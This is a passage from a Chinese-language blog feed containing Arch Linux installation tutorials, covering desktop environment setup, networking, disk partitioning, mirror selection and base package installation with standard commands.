<p>配置好<code>sudo</code>以后，我们进行一次重启，执行：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">reboot</span><br></pre></td></tr></table></figure>
<p>来重启你的电脑。</p>
<p>重启以后输入你<strong>刚创建的用户名与密码</strong>来登录。注意登录后要重新进行联网操作。</p>
<h2 id="图形界面的安装"><a href="#图形界面的安装" class="headerlink" title="图形界面的安装"></a>图形界面的安装</h2><h3 id="显卡驱动的安装"><a href="#显卡驱动的安装" class="headerlink" title="显卡驱动的安装"></a>显卡驱动的安装</h3><p><img src="/images/arch21.png" alt=""></p>
<p>参照这个表格，安装相应的包，比如你是<code>intel</code>的集成显卡（绝大多数人的情况），执行：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S xf86-video-intel</span><br></pre></td></tr></table></figure>
<p>提示：<code>Nvidia</code>的独显驱动如非必要，建议只装集成显卡的驱动（省电，如果同时装也会默认使用集成显卡），不容易出现冲突问题。相反，如果集成显卡驱动有问题无法装上，可以装独显驱动，具体的版本请到下面的链接查询：</p>
<blockquote>
<p>  <a href="https://wiki.archlinux.org/index.php/Xorg#Driver_installation" target="_blank" rel="noopener">https://wiki.archlinux.org/index.php/Xorg#Driver_installation</a></p>
</blockquote>
<h3 id="安装Xorg"><a href="#安装Xorg" class="headerlink" title="安装Xorg"></a>安装Xorg</h3><p><code>Xorg</code>是<code>Linux</code>下的一个著名的开源图形服务，我们的桌面环境需要<code>Xorg</code>的支持。</p>
<p>执行如下命令安装<code>Xorg</code>及相关组件：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S xorg</span><br></pre></td></tr></table></figure>
<h3 id="安装桌面环境"><a href="#安装桌面环境" class="headerlink" title="安装桌面环境"></a>安装桌面环境</h3><p><code>Linux</code>下有很多著名的桌面环境如<code>Xfce</code>、<code>KDE(Plasma)</code>、<code>Gnome</code>、<code>Unity</code>、<code>Deepin</code>等等，它们的外观、操作、设计理念等各方面都有所不同， 在它们之间的比较与选择网上有很多的资料可以去查。</p>
<p>在这里我们选择笔者使用的<code>Xfce</code>和非常流行的<code>KDE(Plasma)</code>作为示范，当然你也可以把它们全部装上换着用……因为<code>Linux</code>的模块化，这样完全没有问题。</p>
<p>更多桌面环境的安装指南请见下面的链接：</p>
<blockquote>
<p>  <a href="https://wiki.archlinux.org/index.php/Desktop_environment#List_of_desktop_environments" target="_blank" rel="noopener">https://wiki.archlinux.org/index.php/Desktop_environment#List_of_desktop_environments</a></p>
</blockquote>
<h4 id="安装Xfce"><a href="#安装Xfce" class="headerlink" title="安装Xfce"></a>安装Xfce</h4><p>直接安装软件包组（包含了很多软件包）即可：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S xfce4 xfce4-goodies</span><br></pre></td></tr></table></figure>
<h4 id="安装KDE-Plasma"><a href="#安装KDE-Plasma" class="headerlink" title="安装KDE(Plasma)"></a>安装KDE(Plasma)</h4><p>直接安装软件包组（包含了很多软件包）即可：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S plasma kde-applications</span><br></pre></td></tr></table></figure>
<h3 id="安装桌面管理器"><a href="#安装桌面管理器" class="headerlink" title="安装桌面管理器"></a>安装桌面管理器</h3><p>安装好了桌面环境包以后，我们需要安装一个图形化的桌面管理器来帮助我们登录并且选择我们使用的桌面环境，这里我推荐使用<code>sddm</code>。</p>
<h4 id="安装sddm"><a href="#安装sddm" class="headerlink" title="安装sddm"></a>安装sddm</h4><p>执行：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S sddm</span><br></pre></td></tr></table></figure>
<h4 id="设置开机启动sddm服务"><a href="#设置开机启动sddm服务" class="headerlink" title="设置开机启动sddm服务"></a>设置开机启动sddm服务</h4><p>这里就要介绍一下<code>Arch</code>下用于管理系统服务的命令<code>systemctl</code>了，服务的作用就是字面意思，为我们提供特定的服务，比如<code>sddm</code>就为我们提供了启动<code>xorg</code>与管理桌面环境的服务。</p>
<p>命令的使用并不复杂：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo systemctl start   服务名 （启动一项服务）</span><br><span class="line">sudo systemctl stop    服务名 （停止一项服务）</span><br><span class="line">sudo systemctl <span class="built_in">enable</span>  服务名 （开机启动一项服务）</span><br><span class="line">sudo systemctl <span class="built_in">disable</span> 服务名 （取消开机启动一项服务）</span><br></pre></td></tr></table></figure>
<p>所以这里我们就执行下面命令来设置开机启动<code>sddm</code>：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo systemctl <span class="built_in">enable</span> sddm</span><br></pre></td></tr></table></figure>
<h3 id="提前配置网络"><a href="#提前配置网络" class="headerlink" title="提前配置网络"></a>提前配置网络</h3><p>到现在我们已经安装好了桌面环境，但是还有一件事情需要我们提前设置一下。由于我们之前使用的一直都是<code>netctl</code>这个自带的网络服务，而桌面环境使用的是<code>NetworkManager</code>这个网络服务，所以我们需要禁用<code>netctl</code>并启用<code>NetworkManager</code>：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo systemctl <span class="built_in">disable</span> netctl</span><br><span class="line">sudo systemctl <span class="built_in">enable</span> NetworkManager （注意大小写）</span><br></pre></td></tr></table></figure>
<p>同时你可能需要安装工具栏工具来显示网络设置图标（某些桌面环境已经装了，但是为了保险可以再装一下）：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S network-manager-applet</span><br></pre></td></tr></table></figure>
<p>这样开机以后我们就可以在图形界面下配置我们的网络啦。</p>
<hr>
<p>重新启动后，如果你看到桌面管理器的界面，选择你需要的桌面环境并输入用户名与密码登陆后，看到了熟悉而又陌生的桌面，那么恭喜你，你已经完成了桌面环境的安装！</p>
<h2 id="你可能需要知道的操作与软件包推荐"><a href="#你可能需要知道的操作与软件包推荐" class="headerlink" title="你可能需要知道的操作与软件包推荐"></a>你可能需要知道的操作与软件包推荐</h2><p>到这里，<code>ArchLinux</code>的安装与基本配置教程已经结束了，笔者在编写过程中基本凭着多次安装的经验与这次安装的记录完成，难免会有疏漏与不正确的地方，还请大家通过下面的评论或邮件(<a href="mailto:viseator@gmail.com">viseator@gmail.com</a>)提出意见与建议。也欢迎你们与我交流安装的问题。</p>
<p><a href="http://www.viseator.com/2017/07/02/arch_more/">下一篇文章</a>介绍了一些实用的配置（如中文输入法的安装）与软件包等。</p>
<h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>如果觉得这篇教程对你有帮助，可以移步我的知乎回答下点个赞，让更多的人可以看到这篇教程，你的支持是我最大的动力：</p>
<blockquote>
<p>  Arch Linux 怎么安装？ - viseator的回答 - 知乎<br>  <a href="https://www.zhihu.com/question/21427410/answer/171867330" target="_blank" rel="noopener">https://www.zhihu.com/question/21427410/answer/171867330</a></p>
</blockquote>
<p><strong>同时，如果你是想要从事计算机方向的新人，非常推荐看看我的分享：</strong>：</p>
<p><a href="https://www.viseator.com/2020/05/24/university_1/">从开始到微信/支付宝/Airbnb/抖音Offer——我的大学客户端开发学习之路（一）开始——步入大学生活</a></p>
<p>也欢迎关注我的微信公众号VirMe：<br><img src="/images/wechat_channel.jpg" alt=""></p>
<p>如果安装过程中遇到问题，可以直接在下方评论区/公众号留言或邮件<a href="mailto:viseator@gmail.com">viseator@gmail.com</a>（尽量附上错误信息），我会尽力回复解决。</p>
]]></content>
      <categories>
        <category>Linux</category>
        <category>Arch</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Arch</tag>
      </tags>
  </entry>
  <entry>
    <title>以官方Wiki的方式安装ArchLinux</title>
    <url>/2017/05/17/arch_install/</url>
    <content><![CDATA[<h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><blockquote>
<p>  <strong>这可能是你能找到的最适合你的中文<code>ArchLinux</code>安装教程。</strong></p>
</blockquote>
<p>前几天硬盘挂了，万幸的是家目录放在了另一块硬盘上所以存活了下来。不得不再重装一遍<code>Arch</code>，算上帮朋友装的，这已经是我第四次安装<code>Arch</code>了。也想借此机会记录这个过程写一篇完全按照官方Wiki指导再加上Wiki上没有重点写出来但是安装过程中会遇到的一些问题的一篇不太一样的安装教程。</p>
<a id="more"></a>
<p>很多人提起起<code>Arch</code>的第一反应就是安装困难，这种困难有很多原因，也就是接下来我们将会面对的问题。</p>
<ul>
<li>没有图形界面的引导：<code>Arch</code>只给我们提供了一个最小的环境，所有的安装操作都需要在命令行中完成，这对于不习惯命令行操作的人来说是最难以跨越的一个坎。许多发行版之所以可以流行开来就是因为他们提供了友好的、流程化的安装过程，这帮很多人解决了学习<code>Linux</code>的第一步：安装一个<code>Linux</code>。</li>
<li>预备知识的不足与缺乏查找并解决问题的能力：一些对于安装系统比较重要的知识例如系统引导、配置文件的编辑、简单的命令行操作等没有接触过，所以操作时往往摸不着头脑，一旦自己的操作结果与教程不符便不知道如何去解决遇到的问题。</li>
<li>缺乏合适的教程：安装Arch最好的也是最完备的教程就是官方的<a href="https://wiki.archlinux.org/index.php/installation_guide" target="_blank" rel="noopener">Installation guide</a>与<a href="https://wiki.archlinux.org/" target="_blank" rel="noopener">Wiki</a>，虽然部分内容有中文版，但是中文的翻译有些时候会落后于英文版，不推荐完全依赖于中文Wiki。并且官方Wiki的写作方式更偏向于文档，没有我们所习惯的按步骤编排的安装过程，给不熟悉这种写作方式的同学造成了阅读与使用上的困难。国内的可以找到的教程往往都是时间比较久远，或是没有提及或是忽略了一些新手容易犯错误的地方。</li>
</ul>
<blockquote>
<p>  <strong>本篇教程致力于与现有的Wiki保持一致，并且适当地加入一些适合初学者学习的链接，希望可以让阅读了这篇教程的同学可以提高自己利用现有及以后可能出现的新的Wiki内容的能力。</strong></p>
</blockquote>
<p><code>ArchLinux</code>或者是<code>Linux</code>的优点就不在这里多说了，我相信打开这篇教程的同学一定可以从这样的过程中得到很多。</p>
<h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><p>请一定<strong>仔细阅读教程中的每一个指示</strong>，绝大部分安装失败都是由于没有仔细看教程，遗漏、错输指令导致的。安装的方式根据引导方式的不同会有所不同，所以请按教程中的指示进行，切忌一味地输命令而不管说明。</p>
<p>对于<strong>硬盘分区相关</strong>的操作，请更加小心检查命令，数据无价。</p>
<p>下面就正式开始我们的教程。</p>
<h2 id="安装教程"><a href="#安装教程" class="headerlink" title="安装教程"></a>安装教程</h2><h3 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h3><h4 id="安装介质"><a href="#安装介质" class="headerlink" title="安装介质"></a>安装介质</h4><p>在安装之前我们先要准备一个安装介质，在这里只推荐U盘作为安装介质。</p>
<ol>
<li><p>到<a href="https://www.archlinux.org/download/" target="_blank" rel="noopener">https://www.archlinux.org/download/</a>页面下方的中国镜像源中下载<code>archlinux-**-x86_64.iso</code>这个<code>iso</code>文件。 </p>
</li>
<li><ul>
<li><p>如果是<code>Linux</code>系统下制作安装介质，推荐使用<code>dd</code>命令，教程：</p>
<blockquote>
<p>  <a href="http://www.runoob.com/linux/linux-comm-dd.html" target="_blank" rel="noopener">http://www.runoob.com/linux/linux-comm-dd.html</a></p>
</blockquote>
</li>
<li><p>如果是<code>windows</code>系统下制作安装介质，推荐使用<code>usbwriter</code>这款轻量级的工具，下载链接：</p>
<blockquote>
<p>  <a href="https://sourceforge.net/projects/usbwriter/" target="_blank" rel="noopener">https://sourceforge.net/projects/usbwriter/</a></p>
</blockquote>
</li>
</ul>
</li>
</ol>
<h4 id="磁盘准备"><a href="#磁盘准备" class="headerlink" title="磁盘准备"></a>磁盘准备</h4><p>我们需要有一块空闲的磁盘区域来进行安装，这里的空闲指的是<strong>没有被分区</strong>的空间。下面来介绍如何准备这块空间。</p>
<ul>
<li><p>在<code>windows</code>下空出一块分区来安装：利用<code>windows</code>自带的磁盘管理工具就可以：</p>
<ol>
<li><p>右击<code>windows</code>图标，在弹出菜单中选择磁盘管理（其他版本的<code>windows</code>请自行找到打开磁盘管理的方式）：</p>
<p><img src="/images/arch01.jpeg" alt=""></p>
</li>
<li><p>右击想要删除的分区，选择删除卷（注意这步之后这个分区的所有数据将会丢失）：</p>
<p><img src="/images/arch02.jpeg" alt=""></p>
</li>
</ol>
</li>
<li><p>在<code>linux</code>下分出一块区域安装：使用<code>fdisk</code>进行，教程请见链接中的删除分区：</p>
<blockquote>
<p>  <a href="http://www.liusuping.com/ubuntu-linux/linux-fdisk-disk.html" target="_blank" rel="noopener">http://www.liusuping.com/ubuntu-linux/linux-fdisk-disk.html</a></p>
</blockquote>
</li>
<li><p>空闲的磁盘（新磁盘）：不需要进行任何操作。</p>
</li>
</ul>
<h3 id="U盘安装"><a href="#U盘安装" class="headerlink" title="U盘安装"></a>U盘安装</h3><p>下面的过程实际上都在刚刚准备好的U盘启动介质上的<code>Linux</code>系统下进行，所以<strong>启动时都应该选择U盘</strong>。</p>
<h4 id="设置启动顺序"><a href="#设置启动顺序" class="headerlink" title="设置启动顺序"></a>设置启动顺序</h4><p>这一步在不同品牌的电脑上都不一样，所以需要大家自行搜索<strong>自己电脑品牌+启动顺序</strong>这个关键词来进行设置。</p>
<p>例如我的电脑搜索神舟 启动顺序可以得到如下的结果：</p>
<blockquote>
<p>  <a href="https://zhidao.baidu.com/question/170954184.html" target="_blank" rel="noopener">https://zhidao.baidu.com/question/170954184.html</a></p>
</blockquote>
<p>一般来说现在的主板都可以不用进入BIOS而快速地切换启动顺序，只要找到相应的快捷键就可以了。</p>
<h4 id="进入U盘下的Linux系统"><a href="#进入U盘下的Linux系统" class="headerlink" title="进入U盘下的Linux系统"></a>进入U盘下的Linux系统</h4><ol>
<li><p>按上一步设置好启动顺序，启动之后会看到如下界面（UEFI启动方式的界面可能不同）：</p>
<p><img src="/images/arch03.jpeg" alt=""></p>
<p>如果直接进入<code>windows</code>，请检查启动顺序是否设置成功，U盘是否在制作启动介质时成功写入。</p>
<p>如果没有看到这个界面，请检查U盘是否制作成功，如果多次遇到问题可以考虑换一个U盘。</p>
<p>选择第一个选项。</p>
</li>
<li><p>这时<code>Arch</code>开始加载，你将会看到屏幕显示如下内容：</p>
<p><img src="/images/arch04.jpeg" alt=""></p>
<p>加载完成后你将会进入一个有命令提示符的界面：</p>
<p><img src="/images/arch05.jpeg" alt=""></p>
<p>如果出现<code>FAIL</code>或是其他错误信息导致无法启动请自行搜索错误信息来获得解决方法。</p>
<p>这就是<code>Linux</code>的终端界面了，接下来我们将通过在这个界面执行一系列命令来将<code>Arch</code>安装到我们的磁盘上。</p>
</li>
</ol>
<hr>
<p>下面进行的过程是按照官方<a href="https://wiki.archlinux.org/index.php/installation_guide" target="_blank" rel="noopener">Installation guide</a>为依据进行的，出现的任何问题都可以到链接中的相应部分查找原文找到解决方式。</p>
<h4 id="检查引导方式"><a href="#检查引导方式" class="headerlink" title="检查引导方式"></a>检查引导方式</h4><p>目前的引导方式主要分为EFI引导+GPT分区表与BIOS(LEGACY)引导+MBR分区表两种，几乎比较新的机器都采用了EFI/GPT引导的方式。关于这部分的内容如果有兴趣可以通过这个链接进行了解：</p>
<blockquote>
<p>  <a href="http://www.chinaz.com/server/2016/1017/595444.shtml" target="_blank" rel="noopener">http://www.chinaz.com/server/2016/1017/595444.shtml</a></p>
</blockquote>
<p>如果你不知道自己的引导方式，请在命令提示符下执行以下命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ls /sys/firmware/efi/efivars</span><br></pre></td></tr></table></figure>
<p>这里的<code>ls</code>是命令，空格后面的一串为路径，作为<code>ls</code>命令的参数。<code>ls</code>命令的作用是显示路径目录下的所有的文件（夹）。</p>
<hr>
<p>如果你对命令行下的常用操作（TAB补全、取消命令等）不熟悉，请先学习了解下面部分实用的快捷键或命令：</p>
<blockquote>
<p>  <strong>Tab键 命令行自动补全。键入命令或文件名的前几个字符，然后按 [Tab] 键，它会自动补全命令或显示匹配你键入字符的所有命令</strong></p>
<p>  ↑(Ctrl+p) 显示上一条命令</p>
<p>  ↓(Ctrl+n) 显示下一条命令</p>
<p>  Ctrl-C: 终止当前正在执行的命令</p>
</blockquote>
<hr>
<p>输入命令并回车执行后，如果提示</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ls: cannot access <span class="string">'/sys/firmware/efi/efivars'</span>: No such file or directory</span><br></pre></td></tr></table></figure>
<p>表明你是以<code>BIOS</code>方式引导，否则为以<code>EFI</code>方式引导。现在只需要记住这个信息，之后这两种引导类型的安装方式会略有不同（下文中涉及到不同的地方请仔细区别）。</p>
<hr>
<p><strong>更新：</strong><br><br>部分同学反馈这种方式并不能100%确认你就是<code>BIOS</code>方式引导的，更加保险的方法是执行<code>fdisk -l</code>查看分区表，如果<strong>你的硬盘（而不是你的U盘）</strong>的<code>Disklabel type</code>属性为<code>gpt</code>并且有一个<code>Type</code>为<code>EFI System</code>的小分区（一般为256M左右，如下图），那么你应该是<code>EFI</code>引导的。<br><br><img src="/images/arch26.png" alt=""></p>
<hr>
<h4 id="联网"><a href="#联网" class="headerlink" title="联网"></a>联网</h4><p><code>arch</code>并不能离线安装，因为我们需要联网来下载需要的组件，所以我们首先要连接网络。</p>
<ul>
<li><p>如果你是有线网并且路由器支持DHCP的话插上网线后先执行以下命令获取IP地址：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dhcpcd</span><br></pre></td></tr></table></figure>
</li>
<li><p>然后执行以下命令来判断网络连接是否正常：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ping www.baidu.com</span><br></pre></td></tr></table></figure>
<p>如果可以看到类似下面的内容就说明连上了网络：</p>
<p><img src="/images/arch05.jpg" alt=""></p>
<blockquote>
<p>  再次提示用快捷键Ctrl-C可以终止当前正在执行的命令</p>
</blockquote>
</li>
<li><p>如果你是无线网，请执行以下命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">iwctl</span><br></pre></td></tr></table></figure>
<p>会进入一个以[iwd]开头的命令行环境中，接着执行：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">device list</span><br></pre></td></tr></table></figure>
<p>会列出当前可用的所有网卡设备，如图所示：</p>
<p><img src="/images/arch27.png" alt=""></p>
<p>记住<code>Name</code>一列你所使用的无线网卡的名称，比如我的就叫<code>wlan0</code>，下面的命令要用到，<strong>下面命令中请替换成自己的网卡名称</strong></p>
<p>接着执行下列命令进行无线网络的扫描：（<strong><code>wlan0</code>替换成你自己的网卡名称</strong>）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">station wlan0 scan</span><br></pre></td></tr></table></figure>
<p>接着执行下列命令列出扫描到的网络：（<strong><code>wlan0</code>替换成你自己的网卡名称</strong>）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">station wlan0 get-networks</span><br></pre></td></tr></table></figure>
<p>可以看到当前扫描到的无线网络都展示出来了：</p>
<p><img src="/images/arch28.png" alt=""></p>
<p>最后输入下列命令连接指定网络：（<strong><code>wlan0</code>替换成你自己的网卡名称，<code>CatAndPomelo</code>替换成你想连的网络名称</strong>）：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">station wlan0 connect CatAndPomelo</span><br></pre></td></tr></table></figure>
<p>这时如果网络有密码的话会提示输入密码，输入后回车确认就行：</p>
<p><img src="/images/arch29.png" alt=""></p>
<p>注意这里就算密码输入错误也不会有提示的，所以请保证密码正确，如果你是中文无线网名称/密码的话建议先改一下，把密码取消会更方便些。</p>
<p>顺利的话，此时你已经连接上网络了，执行下面命令退出<code>iwd</code>：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">quit</span><br></pre></td></tr></table></figure>
<p>连接以后同样可以通过上面的<code>ping</code>命令来进行测试。</p>
<p><code>iwd</code>是一个实用的命令行下联网工具，利用它可以方便地联网，如果它没能起作用，需要进入以下页面查找解决方式：</p>
<blockquote>
<p>  <a href="https://wiki.archlinux.org/index.php/Wireless_network_configuration" target="_blank" rel="noopener">https://wiki.archlinux.org/index.php/Wireless_network_configuration</a></p>
</blockquote>
</li>
</ul>
<p><strong>注意</strong>：由于部分无线网卡驱动的支持并不完善，所以在这里可能会遇到问题，并且各机型的解决方法都不同，如果不幸遇到无线连不上的问题，可以插有线联网先把系统装好再去慢慢解决。解决问题可以参照：<a href="https://wiki.archlinux.org/index.php/Network_configuration" target="_blank" rel="noopener">https://wiki.archlinux.org/index.php/Network_configuration</a></p>
<h4 id="更新系统时间"><a href="#更新系统时间" class="headerlink" title="更新系统时间"></a>更新系统时间</h4><p>执行如下命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">timedatectl <span class="built_in">set</span>-ntp <span class="literal">true</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>  正常情况下这样的命令并没有输出，所谓没有消息就是最好的消息</p>
</blockquote>
<h4 id="分区与格式化"><a href="#分区与格式化" class="headerlink" title="分区与格式化"></a>分区与格式化</h4><p><strong>特别注意：涉及到分区与格式化的操作要格外注意，命令在回车之前请再三确认知道自己在做什么，并且没有输错命令，否则将会来带来数据的丢失！如果有需要在操作之前请备份重要的数据。</strong></p>
<p>但是我们也并不要过于惧怕分区与格式化过程，正确操作的情况下不会对你其他数据产生任何影响。</p>
<h5 id="查看目前的分区情况"><a href="#查看目前的分区情况" class="headerlink" title="查看目前的分区情况"></a>查看目前的分区情况</h5><p>执行命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">fdisk -l</span><br></pre></td></tr></table></figure>
<p>以我的电脑为例：</p>
<p><img src="/images/arch06.jpg" alt=""></p>
<p>可以看到我的一块238.5g的硬盘(<code>/dev/sda</code>就代表这块硬盘)，下面列出了<code>/dev/sda*</code>这三个分区，<code>/dev/sda3</code>是我存活下来的家目录，可以看到它的类型为<code>Linux</code>分区。注意看<code>Start</code>与<code>End</code>的数值，这个数值代表扇区号，可以理解成硬盘被划分成了一个个小单元，可以直观地看出来在<code>/dev/sda2</code>的<code>End</code>与<code>/dev/sda3</code>的<code>Start</code>之间空出了一大块未分配的空间，接下来我们将分配这块区域。</p>
<hr>
<ul>
<li>如果你是BIOS/MBR方式引导，<strong>跳过下面创建一个引导分区</strong>的步骤。</li>
<li>如果你是EFI/GPT方式引导，并且同时安装了其他系统，那么你应该可以在分区列表中发现一个较小的并且类型为EFI的分区（<strong>注意查看硬盘的大小，这个<code>EFI</code>分区有可能是你U盘中的，需要排除</strong>），这是你的引导分区，请记下它的路径（/dev/sdxY)备用，<strong>跳过下面创建一个引导分区</strong>的步骤。</li>
<li>如果你是EFI/GPT方式引导，但是没有这个较小的并且类型为EFI的引导分区（这种情况一般只会出现在新的硬盘），那么你需要<strong>先创建一个引导分区</strong>。</li>
</ul>
<hr>
<h5 id="创建一个引导分区（仅上面所列的第三种情况需要进行这步）"><a href="#创建一个引导分区（仅上面所列的第三种情况需要进行这步）" class="headerlink" title="创建一个引导分区（仅上面所列的第三种情况需要进行这步）"></a>创建一个引导分区（<strong>仅上面所列的第三种情况需要进行这步</strong>）</h5><p>执行命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">fdisk /dev/sdx （请将sdx替换成你要操作的磁盘如sdb sdc等）</span><br></pre></td></tr></table></figure>
<p>下面你就进入了<code>fdisk</code>的操作环境， 输入<code>m</code>并回车可以查看各命令的作用。</p>
<ol>
<li><p><strong>如果你是一块全新的硬盘</strong>：输入<code>g</code>来创建一个全新的gpt分区表，<strong>否则直接进行第2步</strong>。</p>
</li>
<li><p>输入<code>n</code>创建一个新的分区，首先会让你选择起始扇区，一般直接回车使用默认数值即可，然后可以输入结束扇区或是分区大小，这里我们输入<code>+512M</code>来创建一个512M的引导分区。</p>
</li>
<li><p>这时我们可以输入<code>p</code>来查看新创建的分区。</p>
</li>
<li><p>输入<code>t</code>并选择新创建的分区序号来更改分区的类型，输入<code>l</code>可以查看所有支持的类型，输入<code>ef</code>更改分区的类型为<code>EFI</code>。</p>
</li>
<li><p>输入<code>w</code>来将之前所有的操作写入磁盘生效，在这之前可以输入<code>p</code>来确认自己的分区表没有错误。</p>
</li>
<li><p>输入以下命令来格式化刚刚创建的引导分区：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mkfs.fat -F32 /dev/sdxY （请将sdxY替换为刚创建的分区）</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>现在引导分区就创建好了。</p>
<h5 id="创建根分区"><a href="#创建根分区" class="headerlink" title="创建根分区"></a>创建根分区</h5><p>输入命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">fdisk /dev/sdx （请将sdx替换成你要操作的磁盘如sdb sdc等）</span><br></pre></td></tr></table></figure>
<ol>
<li><p><strong>如果你是一块全新的硬盘</strong>（<strong>否则直接进行第2步</strong>）：</p>
<ol>
<li><strong>如果你是<code>BIOS/MBR</code>引导方式</strong>：输入<code>o</code>来创建一个全新的<code>MBR</code>分区表。</li>
<li><strong>如果你在上一步新建了分区表并创建了引导分区</strong>：直接进行步骤2。</li>
<li><strong>如果你在另一块硬盘中已经有引导分区</strong>：输入<code>g</code>来创建一个全新的<code>gpt</code>分区表。</li>
</ol>
</li>
<li><p>输入<code>n</code>创建一个新的分区，首先会让你选择起始扇区，一般直接回车使用默认数值即可，然后可以输入结束扇区或是分区大小，如果我们想要使创建的分区完全占满空闲的空间，可以直接回车使用默认结束扇区。</p>
</li>
<li><p>这时我们可以输入<code>p</code>来查看新创建的分区。</p>
</li>
<li><p>输入<code>w</code>来将之前所有的操作写入磁盘生效，在这之前可以输入<code>p</code>来确认自己的分区表没有错误。</p>
</li>
<li><p>输入以下命令来格式化刚刚创建的根分区：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mkfs.ext4 /dev/sdxY （请将的sdxY替换为刚创建的分区）</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>这是我的分区过程供参考：</p>
<p><img src="/images/arch07.jpg" alt=""></p>
<p><img src="/images/arch08.jpg" alt=""></p>
<hr>
<p><strong>如果你在分区这步遇到了问题</strong>，先看看自己的操作是否与上面的指引一致，如果仍然无法解决可参考<a href="https://www.cnblogs.com/freerqy/p/8502838.html" target="_blank" rel="noopener">https://www.cnblogs.com/freerqy/p/8502838.html</a>这篇文章的“建立硬盘分区”一节尝试使用<code>cfdisk</code>进行分区。</p>
<h4 id="挂载分区"><a href="#挂载分区" class="headerlink" title="挂载分区"></a>挂载分区</h4><p>执行以下命令将根分区挂载到<code>/mnt</code>：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mount /dev/sdxY /mnt （请将sdxY替换为之前创建的根分区）</span><br></pre></td></tr></table></figure>
<hr>
<p><strong>如果你是EFI/GPT引导方式</strong>，执行以下命令创建/boot文件夹并将引导分区挂载到上面。<strong>BIOS/MBR引导方式无需进行这步。</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mkdir /mnt/boot</span><br><span class="line">mount /dev/sdxY /mnt/boot （请将sdxY替换为之前创建或是已经存在的引导分区）</span><br></pre></td></tr></table></figure>
<hr>
<h4 id="选择镜像源"><a href="#选择镜像源" class="headerlink" title="选择镜像源"></a>选择镜像源</h4><p>因为从这步开始，需要进行一些编辑配置文件的操作，所以需要掌握一些命令行下非常著名的一款编辑器<code>Vim</code>的基本操作，在这里推荐学习下面这个链接中的存活部分，可以完成编辑、复制粘贴与保存工作即可。</p>
<blockquote>
<p>  <a href="http://coolshell.cn/articles/5426.html" target="_blank" rel="noopener">http://coolshell.cn/articles/5426.html</a></p>
</blockquote>
<hr>
<p>镜像源是我们下载的软件包的来源，我们需要根据自己的地区选择不同的源来加快下载的速度。</p>
<p>执行以下命令，用<code>Vim</code>来编辑<code>/etc/pacman.d/mirrorlist</code>这个文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim /etc/pacman.d/mirrorlist</span><br></pre></td></tr></table></figure>
<blockquote>
<p>  提示：输入路径时可以用<code>Tab</code>键补全</p>
</blockquote>
<p><img src="/images/arch09.jpg" alt=""></p>
<p>找到标有<code>China</code>的镜像源，<code>normal</code>模式下按下<code>dd</code>可以剪切光标下的行，按<code>gg</code>回到文件首，按<code>P</code>（注意是大写的）将行粘贴到文件最前面的位置（优先级最高）。</p>
<p>当然也可以直接手工输入。</p>
<p>这里推荐使用清华、浙大源：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Server &#x3D; http:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;archlinux&#x2F;$repo&#x2F;os&#x2F;$arch</span><br><span class="line">Server &#x3D; http:&#x2F;&#x2F;mirrors.zju.edu.cn&#x2F;archlinux&#x2F;$repo&#x2F;os&#x2F;$arch</span><br></pre></td></tr></table></figure>
<p>最后记得用<code>:wq</code>命令保存文件并退出。</p>
<h4 id="安装基本包"><a href="#安装基本包" class="headerlink" title="安装基本包"></a>安装基本包</h4><p>下面就要安装最基本的<code>ArchLinux</code>包到磁盘上了。这是一个联网下载并安装的过程。</p>
<p>执行以下命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pacstrap /mnt base base-devel linux linux-firmware dhcpcd</span><br></pre></td></tr></table></figure>
<p>根据下载速度的不同在这里需要等待一段时间，当命令提示符重新出现的时候就可以进行下一步操作了。</p>
<h4 id="配置Fstab"><a href="#配置Fstab" class="headerlink" title="配置Fstab"></a>配置Fstab</h4><p>生成自动挂载分区的<code>fstab</code>文件，执行以下命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">genfstab -L /mnt &gt;&gt; /mnt/etc/fstab</span><br></pre></td></tr></table></figure>
